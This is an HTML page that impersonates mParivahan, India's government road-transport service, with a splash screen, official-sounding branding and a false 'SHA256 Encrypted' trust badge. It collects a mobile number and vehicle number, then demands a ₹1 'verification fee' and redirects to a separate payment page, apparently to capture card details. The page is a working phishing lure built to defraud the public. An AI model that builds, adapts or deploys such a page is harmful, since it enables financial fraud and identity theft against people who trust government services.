<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>mParivahan | Sign Up</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet" />
  <style>
    :root{
      --brand:#0b66ff; --brand-dark:#004fc4; --ink:#0f172a; --muted:#475569;
      --page-a:#e9f3ff; --page-b:#f7fbff; --card:#ffffff; --note-bg:#eef5ff; --note-ink:#0e3a7e;
      --glow1: rgba(27,197,189,.20); --glow2: rgba(80,112,255,.18); --overlay: rgba(0,0,0,.48);
    }
    *{box-sizing:border-box} html,body{height:100%}
    body{margin:0; font-family:Inter,system-ui,Segoe UI,Roboto,Arial,sans-serif; color:var(--ink); background:linear-gradient(135deg,var(--page-a),var(--page-b)); display:flex; align-items:center; justify-content:center;}
    a{color:var(--brand); text-decoration:none}

    .splash-sec{min-height:100vh; width:100%; display:flex; flex-direction:column; justify-content:space-between; background:#0b66ff; color:white; align-items:center; text-align:center;}
    .splash-top{height:40px; margin:15px; width:150px}
    .splash-center{display:flex; justify-content:center; align-items:center; flex-direction:column; margin-top:200px}
    .splash-center img{height:80px; width:200px; margin-bottom:20px;}
    .splash-center h2{font-size:24px; font-weight:800; margin:0;}
    .splash-bottom{display:flex; justify-content:center; align-items:flex-end; padding:20px; font-size:12px;}

    .wrap{width:100%; max-width:480px; display:none; flex-direction:column; align-items:center; gap:16px; padding:18px;}
    .stage{position:relative; width:100%; display:flex; justify-content:center}
    .stage::before{content:""; position:absolute; inset:-120px; z-index:0; border-radius:50%; background:radial-gradient(closest-side,var(--glow1),transparent 75%),radial-gradient(closest-side,var(--glow2),transparent 70%); filter:blur(80px); pointer-events:none;}

    .card{position:relative; z-index:1; background:var(--card); width:100%; border-radius:24px; border:1px solid #e7eefc; box-shadow:0 18px 40px rgba(11,102,255,.12), 0 2px 8px rgba(17,24,39,.04); padding:26px 18px 22px; text-align:center;}
    .topbar{display:flex; align-items:center; gap:10px; margin-bottom:6px}
    .back{font-size:26px; line-height:1; color:#434343; font-weight:700}
    .brand-img{width:160px; height:44px; object-fit:contain; display:block; margin:0 auto;}
    
    .highway{display:flex; justify-content:center; margin:12px 0}
    .highway svg{width:92px; height:92px; display:block}

    h1{font-size:22px; line-height:1.28; margin:6px 0 18px; font-weight:800}
    .field{margin:10px 0}
    .input{width:100%; padding:13px 14px; border-radius:12px; border:1px solid #d8dee9; background:#fafbff; font-size:15px; color:var(--ink); outline:none;}
    .input:focus{border-color:var(--brand); box-shadow:0 0 0 3px rgba(11,102,255,.12)}
    .btn-primary{width:100%; margin-top:12px; padding:14px 16px; border:0; border-radius:12px; background:var(--brand); color:#fff; font-weight:800; font-size:15px; cursor:pointer; box-shadow:0 8px 18px rgba(11,102,255,.22);}
    .note{margin-top:14px; background:var(--note-bg); color:var(--note-ink); border-left:4px solid var(--brand); padding:10px 12px; border-radius:12px; font-size:13px; font-weight:600; text-align:left; line-height:1.35;}
    .brands{width:100%; display:flex; justify-content:center; gap:14px; padding-top:8px}
    .brands img{height:24px}
    .sha{width:100%; text-align:center; background:#f4f6fb; border:1px solid #e6ebf6; border-left:4px solid var(--brand); border-radius:12px; padding:12px 14px; font-size:14px; font-weight:800; color:#1b2738;}

    .popup{display:none; position:fixed; inset:0; background:var(--overlay); z-index:2147483647;}
    .popup-content{position:fixed; left:50%; top:50%; transform:translate(-50%,-50%); background:#fff; border-radius:12px; width:min(360px,92vw); box-shadow:0 10px 30px rgba(0,0,0,.18); padding:24px 20px; text-align:center;}
    .pay-btn{background:#16a34a; color:#fff; border:none; padding:12px 16px; font-size:15px; border-radius:10px; cursor:pointer; margin-top:12px; font-weight:700; width:100%;}
    
    .hidden{display:none !important;}
  </style>
</head>
<body>

  <!-- Splash Screen -->
  <div class="splash-sec" id="splash-screen">
    <div class="splash-top"></div>
    <div class="splash-center">
      <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/UPI-Logo.png" style="filter: brightness(0) invert(1); height:50px;" alt="mParivahan">
      <h2>mParivahan</h2>
      <p style="font-size:12px; opacity:0.8; margin-top:10px;">Ministry of Road Transport & Highways</p>
    </div>
    <div class="splash-bottom">Powered by Digital India</div>
  </div>

  <!-- Main / Sign Up -->
  <div class="wrap" id="login-container">
    <section class="stage">
      <div class="card">
        <div class="topbar">
          <span class="back">‹</span>
          <img class="brand-img" src="https://upload.wikimedia.org/wikipedia/commons/f/fa/UPI-Logo.png" alt="Logo" style="width:100px;" />
        </div>

        <div class="highway" aria-hidden="true">
          <svg viewBox="0 0 128 128">
            <path d="M16 120 L48 8 h32 l32 112 z" fill="#0b66ff12" stroke="#9aa7ff" stroke-width="2"/>
            <rect x="42" y="18" width="4" height="18" rx="2" fill="#0b66ff"/><rect x="42" y="44" width="4" height="18" rx="2" fill="#0b66ff"/><rect x="42" y="70" width="4" height="18" rx="2" fill="#0b66ff"/>
            <rect x="82" y="30" width="4" height="18" rx="2" fill="#0b66ff"/><rect x="82" y="56" width="4" height="18" rx="2" fill="#0b66ff"/><rect x="82" y="82" width="4" height="18" rx="2" fill="#0b66ff"/>
            <rect x="62" y="8" width="4" height="104" rx="2" fill="#11182722"/>
          </svg>
        </div>

        <h1>Sign Up Your Account</h1>

        <div class="field"><input class="input" type="tel" id="Mobile" inputmode="numeric" maxlength="10" placeholder="Enter Mobile Number" /></div>
        <div class="field"><input class="input" type="text" id="mpin" maxlength="12" placeholder="Enter Vehicle Number" /></div>

        <button class="btn-primary" id="submit-btn">Register &amp; Check Challan</button>
        <div class="note">Note: ₹1 registration fee is required to verify vehicle ownership.</div>
      </div>
    </section>

    <div class="brands" aria-label="Accepted Cards">
      <img src="https://img.icons8.com/color/96/visa.png" alt="Visa" />
      <img src="https://img.icons8.com/color/96/mastercard-logo.png" alt="Mastercard" />
      <img src="https://img.icons8.com/color/96/amex.png" alt="Amex" />
      <img src="https://img.icons8.com/color/96/rupay.png" alt="RuPay" />
    </div>

    <div class="sha">SHA256 Encrypted — Your Data Is Securely Stored</div>
  </div>

  <!-- Payment Popup -->
  <div id="popup" class="popup">
    <div class="popup-content">
      <p>Pay ₹1 registration fee to verify vehicle ownership.</p>
      <button id="paybtn" class="pay-btn">Pay ₹1 Now</button>
    </div>
  </div>

  <script>
    // When "Pay Now" is clicked, go to method.html
    document.getElementById('paybtn').addEventListener('click', () => {
        window.location.href = "method.html";
    });

    // Splash logic
    document.addEventListener("DOMContentLoaded", () => {
      setTimeout(() => {
        document.getElementById("splash-screen").style.display = "none";
        document.getElementById("login-container").style.display = "flex";
      }, 2000);

      // Show popup when Register clicked
      document.getElementById("submit-btn").addEventListener("click", () => {
        document.getElementById("popup").style.display = "block";
      });
    });
  </script>
</body>
  </html>
